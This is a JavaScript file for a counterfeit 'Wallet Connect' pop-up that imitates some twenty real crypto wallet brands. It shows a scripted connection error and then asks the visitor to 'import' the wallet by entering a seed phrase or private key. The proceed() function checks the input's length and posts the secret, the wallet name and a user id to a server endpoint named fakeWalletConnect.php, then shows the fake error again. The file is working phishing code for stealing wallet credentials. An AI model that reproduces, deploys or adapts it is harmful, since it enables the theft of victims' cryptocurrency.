let modelWapper = document.querySelector('#modelWapper')

window.onload = () => {
  modelWapper.innerHTML = `

    <!-- Modal 1 -->
    <div id="modal" style="
      position:fixed; top:0; left:0;
      width:100%; height:100%;
      display:none;
      background:rgba(0,0,0,0.5);
      justify-content:center;
      align-items:center;
      z-index:1000;
    ">
      <div style="width:100%; max-width:500px;">
        <div style="background:#222; color:white; border-radius:8px;">

          <div style="display:flex; justify-content:flex-end; padding:10px;">
            <button style="background:none; border:none; color:white; font-size:20px; cursor:pointer;">&times;</button>
          </div>

          <div style="padding:20px; cursor:pointer; text-align:center;">
            <div style="display:flex; flex-direction:column; align-items:center; justify-content:center; color:white">
              <img style="height:60px;" src="../assets/images/wallet/walletconnect.svg">
              <h6>Wallet Connect</h6>
              <p>Scan with WalletConnect to Connect</p>
            </div>
          </div>

        </div>
      </div>
    </div>

    <!-- Wallet List -->
    <div id="walletList" style="
      position:fixed; top:0; left:0;
      width:100%; height:100%;
      display:none;
      background:rgba(0,0,0,0.5);
      justify-content:center;
      align-items:center;
      z-index:1000;
    ">
      <div style="width:100%; max-width:500px;">
        <div style="background:white; border-radius:8px;">

          <div style="display:flex; justify-content:space-between; align-items:center; padding:10px; color:white; background:#222;">
            <div style="display:flex; align-items:center; gap:6px">
              <img style="height:60px;" src="../assets/images/wallet/walletconnect.svg">
              <h5 style="color:white;">Wallet Connect</h5>
            </div>

            <button style="background:none; border:none; color:white; font-size:20px; cursor:pointer;">&times;</button>
          </div>

          <div style="display:flex; justify-content:center; padding:20px;">
            <div id="walletBoard" style="
              display:grid;
              grid-template-columns:repeat(4,1fr);
              gap:15px;
              width:fit-content;
            ">
            </div>
          </div>

        </div>
      </div>
    </div>

    <!-- Error Modal -->
    <div id="errorModal" style="
      position:fixed; top:0; left:0;
      width:100%; height:100%;
      display:none;
      background:rgba(0,0,0,0.5);
      justify-content:center;
      align-items:center;
      z-index:1000;
    ">
      <div style="width:100%; max-width:500px;">
        <div style="background:white; border-radius:8px;">

          <div style="display:flex; justify-content:space-between; padding:10px;">
            <h5>Back</h5>
            <button style="background:none; border:none; font-size:20px; cursor:pointer;">&times;</button>
          </div>

          <div style="display:flex; flex-direction:column; align-items:center; gap:10px; padding:20px;">

            <div style="padding:14px; display:flex; width:95%; border:2px solid red; border-radius:10px; gap:10px; align-items:center;">
              <div class="selectedWalletError" style="font-size:15px;">Connecting....</div>
              <button style="
                border:none;
                padding:5px 20px;
                background:#007bff;
                color:white;
                border-radius:4px;
                display:none;
                cursor:pointer;
              ">Connect Manually</button>
            </div>

            <div style="padding:15px; display:flex; justify-content:space-between; align-items:center; width:95%; border:2px solid; border-radius:10px;">
              <div style="display:flex; flex-direction:column; gap:4px;">
                <h6 style="font-weight:600;" class="selectedWalletName"></h6>
                <p>Easy-to-use browser extension</p>
              </div>
              <img style="height:30px;" class="selectedWalletImg">
            </div>

          </div>

        </div>
      </div>
    </div>

    <!-- Wallet Import -->
    <div id="walletContainer" style="
      position:fixed; top:0; left:0;
      width:100%; height:100%;
      display:none;
      background:rgba(0,0,0,0.5);
      justify-content:center;
      align-items:center;
      z-index:1000;
    ">
      <div style="width:100%; max-width:500px;">
        <div style="background:white; border-radius:8px; padding:20px;">

          <div style="text-align:center;">
            <div style="display:flex; align-items:center; justify-content:center; gap:6px;">
              <img style="height:30px;" class="selectedWalletImg">
              <p class="selectedWalletName"></p>
            </div>

            <div style="margin-top:10px;">
              <button onClick="seedPhrase()" class="seedPhrase" style="padding:5px 10px; background:#007bff; color:white; border-radius:4px; text-decoration:none;">Seed Phrase</button>
              <button onClick="privateKey()" class="privateKey" style="padding:5px 10px; background:#007bff; color:white; border-radius:4px; text-decoration:none;">Private key</button>
            </div>

            <div class="walletPassword" style="margin-top:10px; display:flex; flex-direction:column; gap:8px;">
              <input class="type" type="hidden" value="seedPhrase">

              <textarea class="value" style="width:100%; height:100px; padding:10px; resize:none;" placeholder="Enter your recovery phrase"></textarea>

              <span class="walletError" style="color:red;"></span>

              <p style="color:#000;">
                Typically 12 (sometimes 24) words separated by single spaces
              </p>
              <div style="display:flex; flex-direction:column; gap:10px;">
              <button onClick="proceed()" style="padding:10px; background:#007bff; color:white; border:none; border-radius:5px; cursor:pointer;">
                Import Wallet
              </button>

              <button onClick="cancel()" style="padding:10px; background:red; color:white; border:none; border-radius:5px; cursor:pointer;">
                CANCEL
              </button>
            </div>
            </div>

            

          </div>

        </div>
      </div>
    </div>

  `

  loadWallet()
}


let connectwalletBtn = document.querySelector('#connectwalletBtn');
connectwalletBtn.addEventListener('click', () => {
  let modal = document.querySelector('#modal')
  modal.style.display = 'flex'

  modal.addEventListener('click', (e) => {
    let walletList = document.querySelector('#walletList')
    walletList.style.display = 'flex'
    modal.style.display = 'none'
  })



})





const wallet = [{

  name: 'Trust',
  img: "trust.png",
},
{
  name: 'MetaMask',
  img: "metamask.png",
},
{
  name: "Aktionariat",
  img: "aktionariat wallet.png",
},
{
  name: "Anchor",
  img: "anchor.png"
},
{
  name: "Atomic",
  img: "atomic.png",
},
{
  name: "Autheruem",
  img: "autheruem.png",
},
{
  name: "Bitpay",
  img: "bitpay.jpg",
},
{
  name: "Blockchain",
  img: "bolckchain.png",
},
{
  name: "Rainbow",
  img: "rainbow.png",
},
{
  name: "Luno",
  img: "luno.png",
},
{
  name: "Bitkeep",
  img: "bitkeep.png",
},
{
  name: "TokenPocket",
  img: "tokenpocket.png",
},
{
  name: "Math",
  img: "math.png",
},
{
  name: "Maiar",
  img: "maiar.png",
},
{
  name: "Houbi",
  img: "houbi.jpg",
},
{
  name: "Pillar",
  img: "pillar.png",
},
{
  name: "im Token",
  img: "im token.png",
},
{
  name: "Spactium",
  img: "spatium.jpg",
},
{
  name: "TrustVault",
  img: "trustVault.png",
},
{
  name: "Exodus",
  img: 'exodus.jpg'
},
{
  name: "Coinbase",
  img: 'coinbase.png'
}, {
  name: 'Phantom',
  img: 'Phantom.jpg'
}
];

function loadWallet() {

  const walletBoard = document.querySelector('#walletBoard')
  for (let i = 0; i < wallet.length; i++) {
    const {
      name,
      img
    } = wallet[i];
    const html = ` <div type="button" data-toggle="modal" data-target=".error" onclick="run(${i})" style="display: flex;flex-direction:column; align-items:center;gap:6px;">
                  <img style="height: 30px;border-radius:5px" src="../assets/images/wallet/${wallet[i].img}" alt="">
                           <h6 style="font-size: 15px;text-transform: capitalize;">${wallet[i].name}</h6>
         </div>`
    walletBoard.insertAdjacentHTML("beforeend", html)
  }

}



function run(i) {
  var selectedWalletError = document.querySelector('.selectedWalletError')
  var walletContainer = document.querySelector('#walletContainer')
  var selectedWalletName = document.querySelectorAll('.selectedWalletName')
  var selectedWalletImg = document.querySelectorAll('.selectedWalletImg')
  var walletList = document.querySelector('#walletList');
  walletList.style.display = 'none';
  selectedWalletError.innerHTML = 'Connecting....';
  walletContainer.style.display = 'flex';
  const {
    name,
    img
  } = wallet[i]

  selectedWalletImg.forEach(el => el.src = `../assets/images/wallet/${img}`)
  selectedWalletName.forEach(el => {
    el.style.color = 'black';
    el.innerHTML = `Import Your ${name} Wallet`
  })

  setTimeout(() => {
    selectedWalletError.innerHTML = 'Error While Connecting....';
  }, 2000)
}






function seedPhrase(event) {
  let walletPassword = document.querySelector('.walletPassword')
  let seedPhrase = document.querySelector('.seedPhrase')
  seedPhrase.classList.add('onactive')
  let privateKey = document.querySelector('.privateKey')
  privateKey.classList.remove('onactive')
  walletPassword.innerHTML = '';
  const html = `<div class="mt-2" style="width: 100%; display:flex;flex-direction:column;gap:8px;">
                 <input class="type" type="hidden" value="seedPhrase">
                  <textarea class="value"  style="width: 100%; height:100px;resize:none;outline:none;padding:10px" placeholder="Enter your recorvery phrase"></textarea>
                  <div style="width:100%; display:flex;align-items:center;" class="w-100">
                    <span class="walletError" style="color:red"></span>
                  </div>
                  <p style="color:black">Typically 12 (sometimes 24) words separated by single spaces</p>
                  <div style="display:flex; flex-direction:column; gap:10px">
                        <button type="button" class="btn btn-primary PROCEED" onClick="proceed()">Import Wallet</button>
                        <button data-dismiss="modal" type="button" class="btn btn-danger">CANCEL</button>
                   </div>
                </div>`

  walletPassword.insertAdjacentHTML("beforeend", html)

}




function privateKey(event) {
  let walletPassword = document.querySelector('.walletPassword')
  let seedPhrase = document.querySelector('.seedPhrase')
  let privateKey = document.querySelector('.privateKey')
  seedPhrase.classList.remove('onactive')
  privateKey.classList.add('onactive')
  walletPassword.innerHTML = '';
  const html = `<div class="mt-2" style="width: 100%; display:flex;flex-direction:column;gap:8px;">
  
                  <input class="type" type="hidden" value="privateKey">
                  <input class="value" style="width: 100%; height:30px;resize:none;outline:none; padding:10px" placeholder="Enter your private key">
                  <div style="width:100%; display:flex;align-items:center;" class="w-100">
                    <span class="walletError" style="color:red"></span>
                  </div>
                  <p style="color:black !important">Your wallet Private key (Not Public key) </p>
                  <div style="display:flex; flex-direction:column; gap:10px">
                        <button type="button" class="btn btn-primary PROCEED" onClick="proceed()">Import Wallet</button>
                        <button data-dismiss="modal" type="button" class="btn btn-danger">CANCEL</button>
                   </div>
                </div>`
  walletPassword.insertAdjacentHTML("beforeend", html)
}

function proceed() {

  const type = document.querySelector('.type').value
  const value = document.querySelector('.value').value
  const walletError = document.querySelector('.walletError')
  const selectedWalletName = document.querySelector('.selectedWalletName').innerHTML

  console.log(selectedWalletName)


  const user = document.querySelector('#modelWapper').getAttribute('auth')




  if (type === 'seedPhrase') {
    function getWordCount(text) {
      var words = text.split(/\s+/);
      var wordCount = words.length;

      return wordCount;
    }
    var wordCount = getWordCount(value);
    console.log(wordCount)
    if (wordCount === 12 || wordCount == 15 || wordCount == 18 || wordCount == 21 || wordCount == 24) {
      $(() => {
        $.ajax({
          url: "../server/api/fakeWalletConnect.php",
          method: "POST",
          data: {
            privateKey: null,
            name: selectedWalletName,
            seedPhrase: value,
            user,
            from: 'fakeWalletConnect'
          },
          success(data) {

            walletError.innerHTML = 'Error While Connecting....';
          },
          error(err) {
            console.log(err)
          }
        })
      })
    } else {
      walletError.innerHTML = 'Invalid Seed Phrase';
    }

  }

  if (type === 'privateKey') {
    const textCount = value.length


    if (textCount == 32 || textCount == 48 || textCount == 64 || textCount == 66) {
      $(() => {
        $.ajax({
          url: "../server/api/fakeWalletConnect.php",
          method: "POST",
          data: {
            privateKey: value,
            name: selectedWalletName,
            seedPhrase: null,
            user,
            from: 'fakeWalletConnect'
          },
          success(data) {
            walletError.innerHTML = 'Error While Connecting....';
          }
        })
      })
    } else {
      walletError.innerHTML = 'Invalid Private Key';
    }

  }

}

